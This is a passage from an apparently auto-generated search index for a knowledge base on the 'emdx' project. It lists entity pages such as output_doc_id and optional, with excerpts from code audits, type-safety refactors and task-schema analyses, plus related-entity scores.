<p>...<code>sys</code></p> </li> <li>emdx/commands/status.py: removed <code>Text</code></li> <li>emdx/commands/tags.py: removed <code>normalize_tag_to_emoji</code></li> <li>emdx/config/cli_config.py: removed <code>field</code></li> <li>emdx/config/settings.py: removed <code>DEFAULT_CLAUDE_MODEL</code></li> <li>emdx/database/cascade.py: removed <code>Optional</code></li> <li> <p>emdx/databas...</p> </li> <li> <p>#6256 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [19/37]   Section: Files Modified (17 total)</p> <p>...<code>sys</code> import</p> </li> <li>status.py: Removed unused <code>Text</code> import</li> <li> <p>tags.py: Removed unused <code>normalize_tag_to_emoji</code> import</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 1. UNUSED IMPORTS (High Priority)</p> <p>...atus.py:16<code>- unused import:</code>Text`</p> </li> <li> <p><code>emdx/commands/tags.py:27</code> - unused import: <code>normalize_tag_to_emoji</code></p> </li> <li> <p>#6187 Delegate: Fix PR #453 (Ask the KB). Checkout branch feat/ask-kb. Revie [2/2]   Section: 2. Import Cleanup</p> <p>Moved <code>normalize_tag_to_emoji</code> import from inline (inside method) to top of file with other imports.</p> </li> <li> <p>#6151 Delegate: Review PR #453 (Ask the KB). Run: gh pr diff 453. Check code [6/7]   Section: Code Quality Analysis</p> <p>...are optional with sensible defaults</p> </li> <li>Consistent emoji alias handling: Uses <code>normalize_tag_to_emoji()</code> correctly</li> <li>Proper error propagation: Tags/recent filters flow through all retrieval methods</li> <li>Machine mode separation: Clean stdout/stderr split for pi...</li> </ul>"},{"location":"entities/normalizetagtoemoji/#related-entities","title":"Related Entities","text":"<ul> <li><code>tuple</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>get_default_cli_tool</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>get_db_path</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>field</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>vertical</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>tag system emojis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>source_titles</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>logbrowserhost</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>horizontal</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>get_theme_names</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/object/","title":"object","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-16</p>"},{"location":"entities/object/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3]   Section: 5. <code>search/search_presenter.py:155</code> \u2014 <code>_load_initial_data_sync() -&gt; tuple[Any, list[dict[str, Any]]]</code></p> <p>The first element is a list of <code>SearchResult</code> objects from <code>UnifiedSearchService.get_recent_documents()</code>. The second is <code>list[dict[str, Any]]</code> for popular tags (this one is acceptable since the tag dict shape varies).</p> </li> <li> <p>#6518 Any removal Phase 1: Quick wins   Section: Impact</p> <p>This change improves type safety by:</p> </li> <li>Using <code>object</code> instead of <code>Any</code> for kwargs that are passed through to parent classes</li> <li>Using specific union types for SQL parameters instead of <code>Any</code></li> <li> <p>Using <code>TYPE_CHECKING</code> gua...</p> </li> <li> <p>#6509 Any Type Removal Analysis [synthesis]   Section: Common Themes</p> <p>Recommendation: Keep <code>Any</code> or use <code>object</code> \u2014 this is a Textual convention.</p> </li> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: emdx/commands/review.py</p> <p>Alternative (simpler):</p> </li> </ul> <pre><code>def _output_json(data: dict[str, object] | list[object]) -&gt; None:\n</code></pre> <ul> <li>#6491 Any Type Removal Analysis [1/5]   Section: 2. Line 247: <code>__init__</code> signature <p>Recommended:</p> </li> </ul> <pre><code>def __init__(self, *args: object, **kwargs: object) -&gt; None:\n</code></pre> <ul> <li>#6487 Any Type Removal Analysis [3/5]   Section: 1. Line 51: <code>PaletteResultWidget.__init__</code> kwargs <p>Alternative (simpler):</p> </li> </ul> <pre><code>def __init__(self, result: PaletteResultItem, **kwargs: object) -&gt; None:\n</code></pre> <ul> <li>#6486 Any Type Removal Analysis [2/5]   Section: 1. <code>emdx/ui/browser_container.py</code> <p>...t__(self, initial_theme: str | None = None, args: Any, kwargs: Any)<code>|</code>args: object, **kwargs: object<code>| Generic App init args -</code>object<code>is safer than</code>Any<code>| | 85 |</code>self.browser_states: dict[str, Any] = {}<code>|</code>dict[str, dict[str, object]]` | Stat...</p> </li> </ul>"},{"location":"entities/object/#related-entities","title":"Related Entities","text":"<ul> <li><code>widget</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>taginfo</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>simplevimlinenumbers.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>self.observer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>searchscreen.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>logbrowserhost.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>logbrowser.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>titleinput.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>recommended:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>popular_tags: list[dict[str, any]]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/optional/","title":"optional","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-13</p>"},{"location":"entities/optional/#documents-8","title":"Documents (8)","text":"<ul> <li>#6475 Dead Code and Error Handling Audit: emdx Project   Section: Dead Code Analysis <p>...in <code>__init__.py</code></p> </li> <li>UI module re-exports: Many unused widget exports</li> <li>Type hints: <code>Optional</code>, <code>Any</code>, <code>Dict</code> imported but unused</li> <li> <p>Rich components: <code>Panel</code>, <code>Text</code> imported but unused</p> </li> <li> <p>#6275 Delegate: DEBT-6: Remove dead code   Section: Changes Made</p> <p>...g/settings.py: removed <code>DEFAULT_CLAUDE_MODEL</code></p> </li> <li>emdx/database/cascade.py: removed <code>Optional</code></li> <li>emdx/database/search.py: removed <code>re</code></li> <li> <p>emdx/services/claude_executor.py: removed <code>CliTool</code>, <code>get_cli_config</code>, <code>DEFAULT_CLAUDE_MODEL</code>, `validate_execution_environ...</p> </li> <li> <p>#6256 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [19/37]   Section: Files Modified (17 total)</p> <p>Database:</p> </li> <li>cascade.py: Removed unused <code>Optional</code> import</li> <li> <p>search.py: Removed unused <code>re</code> import</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 1. UNUSED IMPORTS (High Priority)</p> <p>...y:30<code>- unused import:</code>cascade`</p> </li> <li><code>emdx/database/cascade.py:14</code> - unused import: <code>Optional</code></li> <li> <p><code>emdx/database/search.py:5</code> - unused import: <code>re</code></p> </li> <li> <p>#6232 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: Summary</p> <p>...public functions</p> </li> <li>Use of <code>Any</code> types that could be more specific</li> <li>Inconsistent <code>Optional</code> vs <code>| None</code> syntax</li> <li>Missing <code>Protocol</code> definitions where duck typing is used</li> <li> <p>Runtime type error risks</p> </li> <li> <p>#6219 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: Critical Issues (8)</p> <p>...es/cli_executor/base.py:115<code>**Issue:**</code>def parse_stream_line(self, line: str) -&gt; Optional[Dict[str, Any]]:` - uses Any, runtime type errors possible Severity: CRITICAL</p> </li> <li> <p>#6174 Delegate: Audit emdx/main.py and the lazy loading system. Check: (1) a [9/17]   Section: Audit: main.py and Lazy Loading System</p> <p>...imports in main.py are used:</p> </li> <li><code>os</code> \u2014 used in is_safe_mode() and main callback</li> <li><code>Optional</code> from typing \u2014 used in main callback</li> <li><code>typer</code> \u2014 used throughout</li> <li><code>__build_id__</code>, <code>__version__</code> \u2014 used in version command</li> <li> <p><code>LazyTyperGroup</code>, `register_lazy_command...</p> </li> <li> <p>#6422 Delegate: Research upgrading rich from 13.x to 14.x. Identify breaking [3/5]   Section: Impact on EMDX Codebase</p> <p>...ure, not breaking</p> </li> <li><code>rich.text.Text</code> - <code>cell_len</code> property unchanged (new param is optional)</li> </ul>"},{"location":"entities/optional/#related-entities","title":"Related Entities","text":"<ul> <li><code>panel</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.7)</li> <li><code>callable</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.7)</li> <li><code>get_default_cli_tool</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>get_db_path</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>field</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>vertical</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>type safety debt audit - emdx project</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>optional[dict[str, any]]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>logbrowserhost</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>horizontal</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/outputcontent/","title":"output_content","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-16</p>"},{"location":"entities/outputcontent/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6605 Delegate: Fix PR #687: Add ExecutionResultDict TypedDict for Execution   Section: Changes Made</p> <p>...ecutionResult.to_dict()<code>:</code>success<code>,</code>execution_id<code>,</code>log_file<code>,</code>output_doc_id<code>,</code>output_content<code>,</code>tokens_used<code>,</code>input_tokens<code>,</code>output_tokens<code>,</code>cost_usd<code>,</code>execution_time_ms<code>,</code>error_message<code>,</code>exit_code<code>,</code>cli_tool`</p> </li> <li> <p>#6604 Delegate: Add ExecutionResultDict TypedDict for ExecutionResult.to_dic   Section: Changes</p> <p>...ss<code>(bool),</code>execution_id<code>(int),</code>log_file<code>(str),</code>output_doc_id<code>(int | None),</code>output_content<code>(str | None),</code>tokens_used<code>(int),</code>input_tokens<code>(int),</code>output_tokens<code>(int),</code>cost_usd<code>(float),</code>execution_time_ms<code>(int),</code>error_message<code>(str | None),</code>exit_c...</p> </li> <li> <p>#6577 Delegate: Audit emdx/services/ for functions that still return dict[str, Any] [1/3]   Section: 1. <code>unified_executor.py:192</code> \u2014 <code>ExecutionResult.to_dict()</code></p> <p>...ass with 12 fixed fields (<code>success</code>, <code>execution_id</code>, <code>log_file</code>, <code>output_doc_id</code>, <code>output_content</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code>, <code>cost_usd</code>, <code>execution_time_ms</code>, <code>error_message</code>, <code>exit_code</code>, <code>cli_tool</code>). However, this is listed as an **intenti...</p> </li> <li> <p>#6569 Delegate: Check the KB save path \u2014 trace from UnifiedExecutor output t [3/3]   Section: 2. Executor Output Capture (<code>unified_executor.py:452-454</code>)</p> <p>```python if success:     result.output_doc_id = extract_output_doc_id(log_file)     result.output_content = cli_result.output</p> </li> </ul> <pre><code>\n- **#6502** None Type Analysis [1/7]\n  *Section: emdx/commands/delegate.py*\n  &gt; ...llback` (line 196)\n```python\ndef _save_output_fallback(\n    output_file: Path,\n    output_content: str | None,\n    title: str,\n    tags: list[str],\n) -&gt; int | None:\n</code></pre> <p>Verdict: NECESSARY - <code>output_content</code>: Checked with `if not content and output_content and...</p>"},{"location":"entities/outputcontent/#related-entities","title":"Related Entities","text":"<ul> <li><code>execution_time_ms</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.7)</li> <li><code>unified executor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.7)</li> <li><code>`emdx/services/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.7)</li> <li><code>.types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.7)</li> <li><code>_save_output_fallback</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>verdict: necessary (both)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>verdict: necessary (both param and return)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>verdict: n/a</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>verdict: both necessary</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>typer command:</code>view<code>(lines 772-852)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/outputdocid/","title":"output_doc_id","text":"<p>Type: tech_term | Mentioned in: 23 documents | First seen: 2026-02-13</p>"},{"location":"entities/outputdocid/#documents-23","title":"Documents (23)","text":"<ul> <li>#6812 Delegate: Fix DOC-9: Update docs/architecture.md to reflect v0.20.0 TU [4/5]   Section: Changes to <code>docs/architecture.md</code> <p>...tivityDataLoader<code>deduplication logic (tasks with</code>execution_id<code>skip duplicates;</code>output_doc_id` removes duplicate documents)</p> </li> <li>Added jump navigation keys: <code>R/T/D</code> to jump to section headers</li> <li> <p>Added <code>x</code> kill/dismiss, <code>c</code> copy mode, <code>enter/f</code> fullscreen preview...</p> </li> <li> <p>#6811 Delegate: Fix DOC-7: Update docs/cli-api.md to add the --json flag to  [2/5]   Section: Summary</p> <p>...structure showing all fields from <code>SingleResult.to_dict()</code>: <code>task_id</code>, <code>doc_id</code>, <code>output_doc_id</code>, <code>execution_id</code>, <code>exit_code</code>, <code>success</code>, <code>duration_seconds</code>, <code>duration</code></p> </li> <li>Note about optional fields (<code>pr_url</code>, <code>branch_name</code>, <code>error</code>)</li> <li> <p>Parallel task JSON o...</p> </li> <li> <p>#6750 Delegate: Document #6709 (Design: Unified Dashboard Data Model):</p> </li> </ul>"},{"location":"entities/outputdocid/#un-12","title":"Un [1/2]","text":"<p>Section: What was implemented:</p> <p>...matching an existing execution are skipped; documents with IDs matching a task's <code>output_doc_id</code> are removed - Three-tier sorting: Tier 1 (running executions by time), Tier 2 (open/active tasks by priority then time), Tier 3 (recent history by time)</p> <ul> <li> <p>#6605 Delegate: Fix PR #687: Add ExecutionResultDict TypedDict for Execution   Section: Changes Made</p> <p>...elds matching <code>ExecutionResult.to_dict()</code>: <code>success</code>, <code>execution_id</code>, <code>log_file</code>, <code>output_doc_id</code>, <code>output_content</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code>, <code>cost_usd</code>, <code>execution_time_ms</code>, <code>error_message</code>, <code>exit_code</code>, <code>cli_tool</code></p> </li> <li> <p>#6604 Delegate: Add ExecutionResultDict TypedDict for ExecutionResult.to_dic   Section: Changes</p> <p>...Merger types)</p> </li> <li> <p>Fields: <code>success</code> (bool), <code>execution_id</code> (int), <code>log_file</code> (str), <code>output_doc_id</code> (int | None), <code>output_content</code> (str | None), <code>tokens_used</code> (int), <code>input_tokens</code> (int), <code>output_tokens</code> (int), <code>cost_usd</code> (float), <code>execution_time_ms</code> (int), `error...</p> </li> <li> <p>#6577 Delegate: Audit emdx/services/ for functions that still return dict[str, Any] [1/3]   Section: 1. <code>unified_executor.py:192</code> \u2014 <code>ExecutionResult.to_dict()</code></p> <p>...rializes a dataclass with 12 fixed fields (<code>success</code>, <code>execution_id</code>, <code>log_file</code>, <code>output_doc_id</code>, <code>output_content</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code>, <code>cost_usd</code>, <code>execution_time_ms</code>, <code>error_message</code>, <code>exit_code</code>, <code>cli_tool</code>). However, this is list...</p> </li> <li> <p>#6552 Delegate: Review PR #655 using 'gh pr view 655' and 'gh pr diff 655'.  [3/6]   Section: Test Classes</p> <ol> <li>TestSaveTaskFlag (2 tests)</li> </ol> </li> <li><code>--task</code> flag links saved document to task via <code>output_doc_id</code></li> <li> <p><code>--task</code> flag works with stdin input</p> </li> <li> <p>#6538 Delegate: Add missing tests for the --task and --done flags in emdx sa [1/3]   Section: Test Coverage</p> </li> <li>test_task_flag_links_document_to_task - Verifies <code>--task</code> flag links saved document to task via <code>output_doc_id</code></li> <li> <p>test_task_flag_with_stdin - Verifies <code>--task</code> flag works correctly with stdin input</p> </li> <li> <p>#6527 Delegate: Review GitHub PR #649 using 'gh pr view 649' and 'gh pr diff [4/4]   Section: Summary</p> <p>This PR adds two new flags to <code>emdx save</code>:</p> </li> <li><code>--task &lt;id&gt;</code>: Links saved document to a task as its output (<code>output_doc_id</code>)</li> <li> <p><code>--done</code>: Marks the linked task as done (requires <code>--task</code>)</p> </li> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: emdx/commands/delegate.py</p> <p>Recommended Type:</p> </li> </ul> <pre><code>def _safe_update_task(\n    task_id: int | None,\n    *,\n    status: str | None = None,\n    error: str | None = None,\n    execution_id: int | None = None,\n    output_doc_id: int | None = None,\n) -&gt; None:\n</code></pre> <ul> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Tasks Table (Core Entity)</p> <p>...le, group, chain | | <code>execution_id</code> | INTEGER | NULL | FK to executions table | | <code>output_doc_id</code> | INTEGER | NULL | FK to documents (output) | | <code>source_doc_id</code> | INTEGER | NULL | FK to documents (input) | | <code>parent_task_id</code> | INTEGER | NULL | FK to tasks (hier...</p> </li> <li> <p>#6192 Delegate: Investigate the activity browser behavior when showing deleg [1/3]   Section: Data Written to DB by Delegate</p> <p>tasks table:</p> </li> <li><code>prompt</code>: First 500 chars of prompt</li> <li><code>type</code>: \"single\", \"group\", or \"chain\"</li> <li><code>execution_id</code>: Set after UnifiedExecutor returns</li> <li><code>output_doc_id</code>: Set when agent saves output doc</li> <li> <p><code>status</code>: \"active\" \u2192 \"done\"/\"failed\"</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Database Schema</p> <p>...xt</p> </li> <li><code>type</code>: single | group | chain</li> <li><code>execution_id</code>: Links to executions table</li> <li><code>output_doc_id</code>: Result document</li> <li><code>source_doc_id</code>: Input document</li> <li><code>parent_task_id</code>: Hierarchical parent</li> <li><code>seq</code>: Sequence number in parent</li> <li><code>retry_of</code>: Previous attempt</li> <li> <p>`tags...</p> </li> <li> <p>#6180 Delegate: Task System Comprehensive Analysis [15/15]   Section: Core Components</p> <p>...ameplan linkage</p> </li> <li> <p>Fields for delegate activity: <code>prompt</code>, <code>type</code>, <code>execution_id</code>, <code>output_doc_id</code>, <code>source_doc_id</code>, <code>seq</code>, <code>retry_of</code>, <code>tags</code></p> </li> <li> <p>#6172 Delegate: Analyze competing/overlapping concepts in emdx. The system h [8/15]   Section: 2. Tasks System</p> <p>..._at, completed_at,   -- Delegate tracking additions:   prompt, type, execution_id, output_doc_id,   source_doc_id, parent_task_id, seq, retry_of, error, tags ```</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: 3. Tasks Table (<code>models/tasks.py</code>)</p> <p>...ocked/done/failed | | <code>execution_id</code> | INTEGER FK | Links to executions table | | <code>output_doc_id</code> | INTEGER FK | Output document created | | <code>source_doc_id</code> | INTEGER FK | Input document used (--doc flag) | | <code>parent_task_id</code> | INTEGER FK | For group/chain hiera...</p> </li> <li> <p>#6167 Delegate: Analyze how tasks appear in the TUI. Read emdx/ui/browser_co [6/15]   Section: Task System Architecture</p> <p>...table</p> </li> <li> <p>Fields for tracking <code>emdx delegate</code> executions: <code>prompt</code>, <code>execution_id</code>, <code>output_doc_id</code></p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Delegate Activity Tracking Fields (added in migration 034)</p> <p>...lel, chain, etc. | | <code>execution_id</code> | INTEGER | NULL | FK to executions table | | <code>output_doc_id</code> | INTEGER | NULL | FK to documents (output doc) | | <code>source_doc_id</code> | INTEGER | NULL | FK to documents (input context doc) | | <code>parent_task_id</code> | INTEGER | NULL | F...</p> </li> <li> <p>#6161 Delegate: Analyze task usage in prime and status commands. Read emdx/c [7/15]   Section: <code>emdx status</code> \u2014 Delegate Activity Index</p> <p>Key observation: <code>status</code> queries the tasks table as a delegate execution log for AI-driven work. It shows <code>type</code>, <code>output_doc_id</code>, <code>parent_task_id</code>, <code>seq</code>, and other delegate-specific fields.</p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Task Creation in Delegate</p> <ol> <li>Updates on completion (lines 242-255):</li> </ol> </li> <li>Success: <code>status=\"done\"</code>, <code>output_doc_id=doc_id</code></li> <li>Failure: <code>status=\"failed\"</code>, <code>error=result.error_message</code></li> </ul>"},{"location":"entities/outputdocid/#testsavetaskflag-2-tests","title":"TestSaveTaskFlag (2 tests)","text":""},{"location":"entities/outputdocid/#related-entities","title":"Related Entities","text":"<ul> <li><code>retry_of</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.2)</li> <li><code>tasks table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.2)</li> <li><code>depends_on</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.2)</li> <li><code>execution_time_ms</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.2)</li> <li><code>unified executor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.2)</li> <li><code>execution_type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.2)</li> <li><code>parent_task_id</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (9 shared docs, PMI=4.9)</li> <li><code>exit_code</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=4.9)</li> <li><code>mapping[str, any]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.9)</li> <li><code>execution_id</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (19 shared docs, PMI=4.8)</li> </ul>"},{"location":"entities/outputtokens/","title":"output_tokens","text":"<p>Type: tech_term | Mentioned in: 13 documents | First seen: 2026-02-14</p>"},{"location":"entities/outputtokens/#documents-13","title":"Documents (13)","text":"<ul> <li> <p>#6708 Delegate: Analyze how running delegates are tracked in the database. R [3/4]   Section: The <code>executions</code> Table Schema (final form)</p> <p>...T 0 | Total token count | | <code>input_tokens</code> | INTEGER DEFAULT 0 | Input tokens | | <code>output_tokens</code> | INTEGER DEFAULT 0 | Output tokens | | <code>output_text</code> | TEXT (nullable) | Persisted answer text |</p> </li> <li> <p>#6605 Delegate: Fix PR #687: Add ExecutionResultDict TypedDict for Execution   Section: Changes Made</p> <p>...d<code>,</code>log_file<code>,</code>output_doc_id<code>,</code>output_content<code>,</code>tokens_used<code>,</code>input_tokens<code>,</code>output_tokens<code>,</code>cost_usd<code>,</code>execution_time_ms<code>,</code>error_message<code>,</code>exit_code<code>,</code>cli_tool`</p> </li> <li> <p>#6604 Delegate: Add ExecutionResultDict TypedDict for ExecutionResult.to_dic   Section: Changes</p> <p>...None), <code>output_content</code> (str | None), <code>tokens_used</code> (int), <code>input_tokens</code> (int), <code>output_tokens</code> (int), <code>cost_usd</code> (float), <code>execution_time_ms</code> (int), <code>error_message</code> (str | None), <code>exit_code</code> (int | None), <code>cli_tool</code> (str)</p> </li> <li> 